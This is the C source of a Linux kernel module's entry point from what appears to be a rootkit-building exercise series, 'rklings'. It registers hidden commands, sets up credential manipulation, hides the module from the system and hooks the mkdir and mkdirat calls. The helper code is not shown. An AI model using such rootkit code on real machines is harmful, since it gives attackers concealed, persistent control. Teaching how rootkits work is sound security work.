// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive\n");
	return 0;
}

static int __init rk_init(void)
{
	int ret;

	ret = rk_cmd_register("ping", cmd_ping);
	if (ret)
		return ret;
	ret = rk_cmd_register("status", cmd_status);
	if (ret)
		return ret;

	ret = rk_cred_init();
	if (ret)
		return ret;

	ret = rk_module_init();
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret)
		goto fail_mkdirat;

	return 0;

fail_mkdirat:
	unregister_kretprobe(&rk_mkdir_probe);
	return ret;
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings persistence and stealth milestone");
